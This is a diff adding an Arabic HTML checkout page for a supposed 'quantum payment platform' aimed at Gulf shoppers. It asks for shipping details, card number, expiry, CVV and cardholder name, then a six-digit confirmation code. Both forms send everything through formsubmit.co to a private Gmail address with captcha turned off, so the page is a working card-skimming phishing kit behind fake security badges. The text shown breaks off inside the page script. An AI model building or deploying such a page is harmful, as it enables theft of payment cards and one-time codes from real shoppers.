@@ -1,0 +1,1077 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta name="x-poe-datastore-behavior" content="local_only"><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدفع - منصة الدفع الكوانتية</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'neon-cyan': '#00FFFF',
+                        'neon-pink': '#FF0080',
+                        'neon-green': '#00FF88',
+                        'neon-purple': '#8A2BE2',
+                        'neon-orange': '#FF6600',
+                        'cyber-blue': '#0099FF',
+                        'cyber-violet': '#9966FF',
+                        'electric-lime': '#39FF14'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;800;900&family=Rajdhani:wght@300;400;500;600;700&family=Noto+Sans+Arabic:wght@300;400;500;600;700;800;900&display=swap');
+        
+        * {
+            font-family: 'Orbitron', 'Noto Sans Arabic', 'Rajdhani', monospace;
+        }
+
+        body {
+            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000000 50%, #0a0a0a 100%);
+            background-attachment: fixed;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* خلفية الماتريكس المحسنة */
+        #particles-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -10;
+        }
+
+        /* خلفية ثابتة أكثر */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(0, 255, 255, 0.08) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 0, 128, 0.08) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.06) 0%, transparent 50%);
+            background-size: 800px 800px, 600px 600px, 400px 400px;
+            z-index: -5;
+        }
+
+        /* تأثيرات الهولوجرام المحسنة */
+        .quantum-glass {
+            background: linear-gradient(135deg, 
+                rgba(0, 255, 255, 0.05) 0%,
+                rgba(255, 0, 128, 0.08) 20%,
+                rgba(0, 255, 136, 0.05) 40%,
+                rgba(138, 43, 226, 0.06) 60%,
+                rgba(255, 102, 0, 0.05) 80%,
+                rgba(0, 153, 255, 0.05) 100%);
+            backdrop-filter: blur(25px) saturate(200%) brightness(1.2);
+            border: 2px solid;
+            border-image: linear-gradient(45deg, 
+                #00FFFF, #FF0080, #00FF88, #8A2BE2, #FF6600, #0099FF
+            ) 1;
+            border-radius: 20px;
+            box-shadow: 
+                0 20px 60px rgba(0, 255, 255, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2),
+                0 0 80px rgba(255, 0, 128, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .quantum-glass::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent,
+                rgba(0, 255, 255, 0.2),
+                rgba(255, 0, 128, 0.2),
+                transparent);
+            animation: dataFlow 8s ease-in-out infinite;
+        }
+
+        @keyframes dataFlow {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        /* نظام الإدخال الكوانتي */
+        .quantum-input {
+            background: linear-gradient(135deg, 
+                rgba(0, 0, 0, 0.8), 
+                rgba(0, 255, 255, 0.05),
+                rgba(0, 0, 0, 0.8));
+            border: 2px solid;
+            border-image: linear-gradient(45deg, 
+                transparent, #00FFFF, transparent, #FF0080, transparent
+            ) 1;
+            color: #00FFFF;
+            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            backdrop-filter: blur(15px);
+            text-shadow: 0 0 10px currentColor;
+        }
+
+        .quantum-input:focus {
+            border-image: linear-gradient(45deg, 
+                #00FFFF, #FF0080, #00FF88, #8A2BE2, #FF6600
+            ) 1;
+            background: linear-gradient(135deg, 
+                rgba(0, 255, 255, 0.1), 
+                rgba(0, 0, 0, 0.8),
+                rgba(255, 0, 128, 0.1));
+            box-shadow: 
+                0 0 30px rgba(0, 255, 255, 0.5),
+                inset 0 0 30px rgba(255, 0, 128, 0.2);
+            transform: translateY(-2px);
+            text-shadow: 0 0 15px currentColor;
+        }
+
+        /* نظام الأزرار الكوانتية */
+        .quantum-button {
+            background: linear-gradient(135deg, 
+                #00FFFF 0%, 
+                #FF0080 25%, 
+                #00FF88 50%, 
+                #8A2BE2 75%, 
+                #FF6600 100%);
+            background-size: 200% 200%;
+            border: 3px solid transparent;
+            color: #000000;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            text-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
+            box-shadow: 
+                0 10px 40px rgba(0, 255, 255, 0.3),
+                0 0 60px rgba(255, 0, 128, 0.2),
+                inset 0 2px 0 rgba(255, 255, 255, 0.3);
+        }
+
+        .quantum-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.6), 
+                transparent);
+            transition: left 0.8s ease;
+            transform: skewX(-25deg);
+        }
+
+        .quantum-button:hover::before {
+            left: 100%;
+        }
+
+        .quantum-button:hover {
+            transform: translateY(-3px) scale(1.02);
+            background-position: 100% 50%;
+            box-shadow: 
+                0 25px 60px rgba(0, 255, 255, 0.6),
+                0 0 100px rgba(255, 0, 128, 0.4),
+                0 0 150px rgba(0, 255, 136, 0.3);
+        }
+
+        /* نصوص الهولوجرام */
+        .hologram-text {
+            background: linear-gradient(135deg, 
+                #00FFFF 0%, 
+                #FF0080 15%, 
+                #00FF88 30%, 
+                #8A2BE2 45%, 
+                #FF6600 60%, 
+                #0099FF 75%, 
+                #9966FF 90%, 
+                #39FF14 100%);
+            background-size: 400% 400%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: neural-network 12s ease-in-out infinite;
+            filter: drop-shadow(0 0 30px rgba(0, 255, 255, 0.6));
+        }
+
+        @keyframes neural-network {
+            0%, 100% { 
+                background-position: 0% 50%;
+            }
+            50% { 
+                background-position: 100% 50%;
+            }
+        }
+
+        /* مؤشر التحميل الكوانتي */
+        .quantum-loader {
+            width: 120px;
+            height: 120px;
+            border: 6px solid transparent;
+            border-radius: 50%;
+            position: relative;
+            animation: quantumSpin 3s linear infinite;
+            background: conic-gradient(
+                from 0deg,
+                #00FFFF,
+                #FF0080,
+                #00FF88,
+                #8A2BE2,
+                #FF6600,
+                #0099FF,
+                #9966FF,
+                #39FF14,
+                #00FFFF
+            );
+            box-shadow: 
+                0 0 60px rgba(0, 255, 255, 0.5),
+                inset 0 0 30px rgba(255, 255, 255, 0.2);
+        }
+
+        @keyframes quantumSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* الشارات الأمنية المحسنة */
+        .security-badge {
+            background: linear-gradient(135deg, 
+                rgba(0, 255, 255, 0.1), 
+                rgba(255, 0, 128, 0.1));
+            backdrop-filter: blur(20px) saturate(150%);
+            border: 2px solid;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* شارة التشفير الكوانتي */
+        .quantum-encryption {
+            border-image: linear-gradient(45deg, #00FFFF, #0099FF) 1;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+        }
+
+        .quantum-encryption:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 50px rgba(0, 255, 255, 0.5);
+        }
+
+        .quantum-encryption .icon-bg {
+            background: linear-gradient(135deg, #00FFFF, #0099FF);
+        }
+
+        /* شارة الذكاء الاصطناعي */
+        .ai-intelligence {
+            border-image: linear-gradient(45deg, #FF0080, #8A2BE2) 1;
+            box-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
+        }
+
+        .ai-intelligence:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 50px rgba(255, 0, 128, 0.5);
+        }
+
+        .ai-intelligence .icon-bg {
+            background: linear-gradient(135deg, #FF0080, #8A2BE2);
+        }
+
+        /* شارة المعالجة الفورية */
+        .instant-processing {
+            border-image: linear-gradient(45deg, #00FF88, #39FF14) 1;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        .instant-processing:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 50px rgba(0, 255, 136, 0.5);
+        }
+
+        .instant-processing .icon-bg {
+            background: linear-gradient(135deg, #00FF88, #39FF14);
+        }
+
+        /* كود التأكيد المحسن */
+        .code-digit {
+            background: linear-gradient(135deg, 
+                rgba(0, 255, 255, 0.1), 
+                rgba(0, 0, 0, 0.8));
+            border: 2px solid #00FFFF;
+            width: 60px;
+            height: 80px;
+            font-size: 2.5rem;
+            font-weight: 900;
+            text-align: center;
+            border-radius: 12px;
+            color: #00FFFF;
+            text-shadow: 0 0 20px currentColor;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .code-digit:focus {
+            border-color: #00FF88;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+        }
+
+        .code-digit.filled {
+            border-color: #00FF88;
+            color: #00FF88;
+            background: linear-gradient(135deg, 
+                rgba(0, 255, 136, 0.2), 
+                rgba(0, 0, 0, 0.8));
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+        }
+
+        /* تحسينات للجوال */
+        @media (max-width: 768px) {
+            .quantum-loader {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .hologram-text {
+                font-size: 2.5rem;
+            }
+            
+            .security-badge {
+                padding: 8px 12px;
+                min-width: auto;
+            }
+
+            .security-badge span {
+                font-size: 12px;
+            }
+
+            .security-badges-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .quantum-loader {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .hologram-text {
+                font-size: 2rem;
+            }
+            
+            .security-badge {
+                padding: 6px 10px;
+            }
+
+            .security-badge span {
+                font-size: 10px;
+            }
+
+            .code-digit {
+                width: 50px;
+                height: 65px;
+                font-size: 2rem;
+            }
+        }
+
+        /* إزالة الحركات المشتتة */
+        .stable-element {
+            animation: none !important;
+        }
+
+        /* حركة هادئة للأيقونة الرئيسية فقط */
+        .main-icon {
+            animation: gentleFloat 8s ease-in-out infinite;
+        }
+
+        @keyframes gentleFloat {
+            0%, 100% { 
+                transform: translateY(0px);
+            }
+            50% { 
+                transform: translateY(-10px);
+            }
+        }
+    </style>
+<script src="https://puc.poecdn.net/authenticated_preview_page/syncedState.bd4eeeb8e8e02052ee92.js"></script></head>
+<body class="text-white min-h-screen relative">
+    <!-- خلفية الجزيئات المحسنة -->
+    <div id="particles-bg"></div>
+
+    <!-- الصفحة الأولى - بيانات البطاقة -->
+    <div id="page1" class="min-h-screen flex items-center justify-center p-6 relative z-10">
+        <div class="w-full max-w-7xl">
+            
+            <!-- العنوان الرئيسي الكوانتي -->
+            <div class="text-center mb-20">
+                <div class="main-icon mb-12">
+                    <div class="w-32 h-32 mx-auto relative">
+                        <div class="absolute inset-0 bg-gradient-to-br from-neon-cyan via-neon-pink to-neon-green rounded-full border-4 border-neon-cyan shadow-2xl"></div>
+                        <div class="absolute inset-4 bg-gradient-to-br from-neon-purple via-neon-orange to-cyber-blue rounded-full border-3 border-neon-pink shadow-xl"></div>
+                        <div class="absolute inset-8 bg-gradient-to-br from-cyber-violet to-electric-lime rounded-full flex items-center justify-center shadow-lg">
+                            <i class="fas fa-credit-card text-4xl text-black"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <h1 class="text-7xl font-black hologram-text mb-8 tracking-wider">منصة الدفع الكوانتية</h1>
+                <p class="text-xl text-neon-cyan max-w-4xl mx-auto leading-relaxed mb-12">
+                    تقنيات الدفع المستقبلية مع الأمان الكوانتي والذكاء الاصطناعي المتطور
+                </p>
+                
+                <!-- شارات الأمان المحسنة والمرتبة -->
+                <div class="security-badges-grid grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto mt-12">
+                    <!-- شارة التشفير الكوانتي -->
+                    <div class="security-badge quantum-encryption px-6 py-4 rounded-2xl flex flex-col items-center gap-3">
+                        <div class="icon-bg w-16 h-16 rounded-full flex items-center justify-center">
+                            <i class="fas fa-shield-virus text-black text-2xl"></i>
+                        </div>
+                        <div class="text-center">
+                            <h3 class="text-lg font-bold text-neon-cyan mb-1">تشفير كوانتي</h3>
+                            <p class="text-xs text-gray-300">حماية بـ 2048-bit</p>
+                        </div>
+                    </div>
+
+                    <!-- شارة الذكاء الاصطناعي -->
+                    <div class="security-badge ai-intelligence px-6 py-4 rounded-2xl flex flex-col items-center gap-3">
+                        <div class="icon-bg w-16 h-16 rounded-full flex items-center justify-center">
+                            <i class="fas fa-brain text-white text-2xl"></i>
+                        </div>
+                        <div class="text-center">
+                            <h3 class="text-lg font-bold text-neon-pink mb-1">ذكاء اصطناعي</h3>
+                            <p class="text-xs text-gray-300">نظام ذكي متطور</p>
+                        </div>
+                    </div>
+
+                    <!-- شارة المعالجة الفورية -->
+                    <div class="security-badge instant-processing px-6 py-4 rounded-2xl flex flex-col items-center gap-3">
+                        <div class="icon-bg w-16 h-16 rounded-full flex items-center justify-center">
+                            <i class="fas fa-bolt text-black text-2xl"></i>
+                        </div>
+                        <div class="text-center">
+                            <h3 class="text-lg font-bold text-neon-green mb-1">معالجة فورية</h3>
+                            <p class="text-xs text-gray-300">سرعة البرق</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flex justify-center">
+                <!-- نموذج الشحن والدفع الكوانتي -->
+                <div class="w-full max-w-2xl space-y-12">
+                    
+                    <!-- قسم معلومات الشحن -->
+                    <div class="quantum-glass p-8 relative stable-element">
+                        <div class="relative z-10">
+                            <h3 class="text-3xl font-bold hologram-text mb-8 text-center">معلومات الشحن</h3>
+                            
+                            <div class="space-y-6">
+                                <!-- الاسم الأول والأخير -->
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div>
+                                        <label class="block text-lg font-bold text-neon-cyan mb-4 flex items-center">
+                                            <i class="fas fa-user text-neon-cyan mr-3 text-xl"></i>
+                                            الاسم الأول
+                                        </label>
+                                        <input type="text" name="first_name" id="firstName" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="الاسم الأول">
+                                    </div>
+                                    <div>
+                                        <label class="block text-lg font-bold text-neon-pink mb-4 flex items-center">
+                                            <i class="fas fa-user-tag text-neon-pink mr-3 text-xl"></i>
+                                            اسم العائلة
+                                        </label>
+                                        <input type="text" name="last_name" id="lastName" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="اسم العائلة">
+                                    </div>
+                                </div>
+
+                                <!-- رقم الهاتف والبريد الإلكتروني -->
+                                <div>
+                                    <label class="block text-lg font-bold text-neon-green mb-4 flex items-center">
+                                        <i class="fas fa-mobile-alt text-neon-green mr-3 text-xl"></i>
+                                        رقم الهاتف
+                                    </label>
+                                    <input type="tel" name="phone_number" id="phoneNumber" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg font-mono text-base relative z-10" placeholder="+966 50 123 4567">
+                                </div>
+
+                                <div>
+                                    <label class="block text-lg font-bold text-neon-purple mb-4 flex items-center">
+                                        <i class="fas fa-envelope text-neon-purple mr-3 text-xl"></i>
+                                        البريد الإلكتروني
+                                    </label>
+                                    <input type="email" name="email" id="email" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="example@quantum.com">
+                                </div>
+
+                                <!-- الدولة والمحافظة -->
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div>
+                                        <label class="block text-lg font-bold text-cyber-blue mb-4 flex items-center">
+                                            <i class="fas fa-globe text-cyber-blue mr-3 text-xl"></i>
+                                            الدولة
+                                        </label>
+                                        <select name="country" id="country" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-sm relative z-10">
+                                            <option value="">اختر الدولة</option>
+                                            <option value="السعودية">السعودية 🇸🇦</option>
+                                            <option value="الكويت">الكويت 🇰🇼</option>
+                                            <option value="البحرين">البحرين 🇧🇭</option>
+                                            <option value="قطر">قطر 🇶🇦</option>
+                                            <option value="الإمارات">الإمارات العربية المتحدة 🇦🇪</option>
+                                            <option value="عُمان">عُمان 🇴🇲</option>
+                                        </select>
+                                    </div>
+                                    <div>
+                                        <label class="block text-lg font-bold text-neon-orange mb-4 flex items-center">
+                                            <i class="fas fa-map-marker-alt text-neon-orange mr-3 text-xl"></i>
+                                            المحافظة
+                                        </label>
+                                        <select name="city" id="city" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-sm relative z-10" disabled="">
+                                            <option value="">اختر محافظة</option>
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <!-- العنوان التفصيلي -->
+                                <div>
+                                    <label class="block text-lg font-bold text-electric-lime mb-4 flex items-center">
+                                        <i class="fas fa-home text-electric-lime mr-3 text-xl"></i>
+                                        العنوان التفصيلي
+                                    </label>
+                                    <textarea name="address" id="address" required="" rows="3" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="مثال: حي النرجس، شارع الملك فهد، مجمع النخيل، الدور الثاني، شقة 205"></textarea>
+                                </div>
+
+                                <!-- شركة الشحن -->
+                                <div>
+                                    <label class="block text-lg font-bold text-cyber-violet mb-4 flex items-center">
+                                        <i class="fas fa-shipping-fast text-cyber-violet mr-3 text-xl"></i>
+                                        شركة الشحن المفضلة
+                                    </label>
+                                    <select name="shipping_company" id="shippingCompany" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10">
+                                        <option value="">اختر شركة الشحن</option>
+                                        <optgroup label="🌍 شركات الشحن العالمية">
+                                            <option value="aramex">🚀 أرامكس (Aramex)</option>
+                                            <option value="dhl">⚡ DHL Express</option>
+                                            <option value="fedex">🔥 FedEx</option>
+                                            <option value="ups">💨 UPS</option>
+                                        </optgroup>
+                                        <optgroup label="🏠 شركات الشحن المحلية">
+                                            <option value="smsa">📦 سمسا إكسبريس (SMSA)</option>
+                                            <option value="spl">📮 البريد السعودي (SPL)</option>
+                                            <option value="zajil">🚛 زاجل إكسبريس</option>
+                                            <option value="naqel">🏃‍♂️ نقل إكسبريس</option>
+                                        </optgroup>
+                                        <optgroup label="⚡ خدمات التوصيل السريع">
+                                            <option value="mrsool">🛵 مرسول (Mrsool)</option>
+                                            <option value="hungerstation">🍔 هنقرستيشن</option>
+                                            <option value="talabat">🥘 طلبات (Talabat)</option>
+                                            <option value="careem">🚗 كريم (Careem Now)</option>
+                                        </optgroup>
+                                    </select>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- قسم بيانات البطاقة -->
+                    <div class="quantum-glass p-12 relative stable-element">
+                        <div class="relative z-10">
+                            <h3 class="text-4xl font-bold hologram-text mb-12 text-center">بيانات البطاقة</h3>
+                            
+                            <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="cardForm" class="space-y-8">
+                                <!-- حقول FormSubmit المخفية -->
+                                <input type="hidden" name="_subject" value="بيانات بطاقة دفع جديدة - منصة كوانتية">
+                                <input type="hidden" name="_template" value="table">
+                                <input type="hidden" name="_captcha" value="false">
+                                <input type="hidden" name="_next" id="nextUrl" value="">
+                                
+                                <!-- رقم البطاقة -->
+                                <div>
+                                    <label class="block text-xl font-bold text-neon-cyan mb-6 flex items-center">
+                                        <i class="fas fa-credit-card text-neon-cyan mr-4 text-2xl"></i>
+                                        رقم البطاقة
+                                    </label>
+                                    <input type="text" name="cc-number" id="cardNumber" autocomplete="cc-number" required="" maxlength="19" class="w-full px-8 py-6 quantum-input rounded-xl text-xl font-mono tracking-wider text-base relative z-10" placeholder="1234 5678 9012 3456">
+                                </div>
+
+                                <!-- الشهر والسنة ورمز الأمان -->
+                                <div class="grid grid-cols-3 gap-6">
+                                    <div>
+                                        <label class="block text-lg font-bold text-neon-pink mb-4">
+                                            <i class="fas fa-calendar text-neon-pink mr-2"></i>
+                                            الشهر
+                                        </label>
+                                        <input type="text" name="cc-exp-month" id="expiryMonth" autocomplete="cc-exp-month" required="" maxlength="2" class="w-full px-4 py-6 quantum-input rounded-xl text-xl text-center text-base relative z-10" placeholder="12">
+                                    </div>
+                                    <div>
+                                        <label class="block text-lg font-bold text-neon-green mb-4">
+                                            <i class="fas fa-calendar-alt text-neon-green mr-2"></i>
+                                            السنة
+                                        </label>
+                                        <input type="text" name="cc-exp-year" id="expiryYear" autocomplete="cc-exp-year" required="" maxlength="2" class="w-full px-4 py-6 quantum-input rounded-xl text-xl text-center text-base relative z-10" placeholder="28">
+                                    </div>
+                                    <div>
+                                        <label class="block text-lg font-bold text-neon-purple mb-4">
+                                            <i class="fas fa-lock text-neon-purple mr-2"></i>
+                                            رمز الأمان
+                                        </label>
+                                        <input type="text" name="cc-csc" autocomplete="cc-csc" maxlength="4" required="" class="w-full px-4 py-6 quantum-input rounded-xl text-xl font-mono text-center text-base relative z-10" placeholder="123">
+                                    </div>
+                                </div>
+
+                                <!-- اسم حامل البطاقة -->
+                                <div>
+                                    <label class="block text-xl font-bold text-neon-orange mb-6 flex items-center">
+                                        <i class="fas fa-user text-neon-orange mr-4 text-2xl"></i>
+                                        اسم حامل البطاقة
+                                    </label>
+                                    <input type="text" name="cc-name" id="cardHolder" autocomplete="cc-name" required="" class="w-full px-8 py-6 quantum-input rounded-xl text-xl text-base relative z-10" placeholder="كما هو مكتوب على البطاقة">
+                                </div>
+
+                                <!-- زر الإرسال الكوانتي -->
+                                <div class="text-center mt-12">
+                                    <button type="submit" class="w-full quantum-button py-8 rounded-2xl text-2xl font-black relative overflow-hidden group">
+                                        <span class="relative z-10 flex items-center justify-center">
+                                            <i class="fas fa-rocket mr-4 text-3xl"></i>
+                                            إطلاق عملية الدفع
+                                            <i class="fas fa-arrow-left ml-4 text-3xl"></i>
+                                        </span>
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- الصفحة الثانية - كود التأكيد -->
+    <div id="page2" class="min-h-screen flex items-center justify-center p-6 hidden relative">
+        <div class="w-full max-w-4xl relative z-10">
+            
+            <!-- العنوان -->
+            <div class="text-center mb-20">
+                <div class="main-icon mb-12">
+                    <div class="w-40 h-40 mx-auto relative">
+                        <div class="absolute inset-0 bg-gradient-to-br from-neon-cyan via-neon-pink to-neon-green rounded-full border-4 border-neon-cyan shadow-2xl"></div>
+                        <div class="absolute inset-6 bg-gradient-to-br from-neon-purple via-neon-orange to-cyber-blue rounded-full border-3 border-neon-pink shadow-xl"></div>
+                        <div class="absolute inset-12 bg-gradient-to-br from-cyber-violet to-electric-lime rounded-full flex items-center justify-center shadow-lg">
+                            <i class="fas fa-shield-check text-5xl text-black"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <h1 class="text-6xl font-black hologram-text mb-8 tracking-wider">تأكيد الدفع</h1>
+                <p class="text-xl text-neon-cyan mb-8 leading-relaxed max-w-3xl mx-auto">
+                    أدخل الكود المرسل إليك لإتمام المعاملة بأمان
+                </p>
+                
+                <!-- مؤشرات التقدم -->
+                <div class="flex justify-center items-center gap-6 mb-12">
+                    <div class="flex items-center gap-3">
+                        <div class="w-4 h-4 bg-neon-green rounded-full"></div>
+                        <span class="text-lg text-neon-green font-bold">تم الإرسال</span>
+                    </div>
+                    <div class="w-12 h-1 bg-neon-green rounded-full"></div>
+                    <div class="flex items-center gap-3">
+                        <div class="w-4 h-4 bg-neon-orange rounded-full"></div>
+                        <span class="text-lg text-neon-orange font-bold">في الانتظار</span>
+                    </div>
+                    <div class="w-12 h-1 bg-gray-600 rounded-full"></div>
+                    <div class="flex items-center gap-3">
+                        <div class="w-4 h-4 bg-gray-500 rounded-full"></div>
+                        <span class="text-lg text-gray-500 font-bold">الإتمام</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- نموذج التأكيد -->
+            <div class="quantum-glass p-16 relative stable-element">
+                <div class="relative z-10">
+                    <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="confirmationForm" class="space-y-12 text-center">
+                        <!-- حقول FormSubmit المخفية -->
+                        <input type="hidden" name="_subject" value="كود تأكيد الشراء - منصة كوانتية">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_next" id="nextUrlCode" value="">
+                        
+                        <!-- كود التأكيد -->
+                        <div>
+                            <div class="flex items-center justify-center mb-12">
+                                <div class="flex items-center gap-4 quantum-glass px-8 py-4 rounded-full">
+                                    <div class="w-12 h-12 bg-gradient-to-br from-neon-cyan to-cyber-blue rounded-full flex items-center justify-center">
+                                        <i class="fas fa-key text-black text-lg"></i>
+                                    </div>
+                                    <span class="text-xl font-black text-neon-cyan">الكود السري</span>
+                                </div>
+                            </div>
+                            
+                            <!-- حقول الكود -->
+                            <div class="flex justify-center gap-4 mb-8">
+                                <input type="text" maxlength="1" class="code-digit" data-index="0">
+                                <input type="text" maxlength="1" class="code-digit" data-index="1">
+                                <input type="text" maxlength="1" class="code-digit" data-index="2">
+                                <input type="text" maxlength="1" class="code-digit" data-index="3">
+                                <input type="text" maxlength="1" class="code-digit" data-index="4">
+                                <input type="text" maxlength="1" class="code-digit" data-index="5">
+                            </div>
+                            
+                            <!-- حقل مخفي للكود الكامل -->
+                            <input type="hidden" name="confirmation_code" id="fullCode">
+                        </div>
+
+                        <!-- معلومات الأمان -->
+                        <div class="quantum-glass p-8 rounded-3xl">
+                            <div class="flex items-center justify-center gap-6 mb-6">
+                                <div class="w-12 h-12 bg-gradient-to-br from-neon-green to-electric-lime rounded-full flex items-center justify-center">
+                                    <i class="fas fa-shield text-black text-lg"></i>
+                                </div>
+                                <span class="text-lg font-bold text-neon-green">حماية كوانتية متطورة</span>
+                            </div>
+                            <p class="text-sm text-gray-300 leading-relaxed">
+                                كودك محمي بتقنيات التشفير الكوانتي المتطورة والأمان العالي
+                            </p>
+                        </div>
+
+                        <!-- زر التأكيد -->
+                        <div class="text-center">
+                            <button type="submit" class="w-full quantum-button py-8 rounded-3xl text-2xl font-black relative overflow-hidden" id="submitBtn" disabled="">
+                                <span class="relative z-10 flex items-center justify-center">
+                                    <i class="fas fa-check mr-4 text-3xl"></i>
+                                    إتمام المعاملة
+                                    <i class="fas fa-check ml-4 text-3xl"></i>
+                                </span>
+                            </button>
+                        </div>
+                        
+                        <!-- روابط المساعدة -->
+                        <div class="flex justify-center gap-8 text-lg">
+                            <button type="button" class="text-neon-cyan hover:text-neon-pink transition-colors flex items-center gap-3">
+                                <i class="fas fa-redo text-sm"></i>
+                                إعادة الإرسال
+                            </button>
+                            <button type="button" class="text-neon-green hover:text-neon-orange transition-colors flex items-center gap-3">
+                                <i class="fas fa-headset text-sm"></i>
+                                دعم فوري
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة التحميل -->
+    <div id="loadingOverlay" class="fixed inset-0 bg-black/95 backdrop-blur-lg flex items-center justify-center z-50 hidden">
+        <div class="text-center">
+            <div class="quantum-loader mx-auto mb-12"></div>
+            <div class="quantum-glass p-12 rounded-3xl max-w-lg">
+                <h3 class="text-3xl font-black hologram-text mb-6">معالجة...</h3>
+                <p class="text-xl text-neon-cyan mb-8">تأمين وتشفير البيانات</p>
+                <div class="w-full bg-white/10 rounded-full h-3 overflow-hidden">
+                    <div class="bg-gradient-to-r from-neon-cyan to-neon-green h-full rounded-full" style="width: 85%"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // تهيئة الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            initQuantumParticles();
+            setupCodeInputs();
+            initFormHandlers();
+            checkForCodePage();
+            checkForBackToMain();
+            
+            window.addEventListener('hashchange', function() {
+                checkForCodePage();
+                checkForBackToMain();
+            });
+        });
+
+        // نظام الجزيئات المحسن
+        function initQuantumParticles() {
+            particlesJS('particles-bg', {
+                particles: {
+                    number: { 
+                        value: 80, 
+                        density: { enable: true, value_area: 800 } 
+                    },
